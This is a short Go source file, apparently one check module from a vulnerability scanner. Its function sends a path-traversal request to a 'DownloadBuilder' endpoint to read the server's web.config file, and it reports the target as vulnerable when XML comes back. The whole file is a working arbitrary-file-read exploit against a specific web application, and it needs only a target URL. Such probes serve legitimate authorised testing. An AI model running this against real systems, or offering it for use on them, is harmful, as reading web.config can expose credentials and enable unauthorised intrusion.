package vulList

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"

	"github.com/fatih/color"
)

func DownloadBuilderCheck(target string) error {
	baseurl := target + "BaseModule/ReportManage/DownloadBuilder?filename=/../web.config"
	resp, err := http.Get(baseurl)
	if err != nil {
		return fmt.Errorf("Error sending request: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("Error reading response body: %v", err)
	}

	responseBody := string(body)

	if strings.Contains(responseBody, `<?xml version="1.0"?>`) {
		green := color.New(color.FgGreen)
		green.Println("[+]DownloadBuilder arbitrary file read vulnerability")
		fmt.Println()
	} else {
		fmt.Println("[-]DownloadBuilder arbitrary file read vulnerability")
		fmt.Println()
	}
	return nil
}
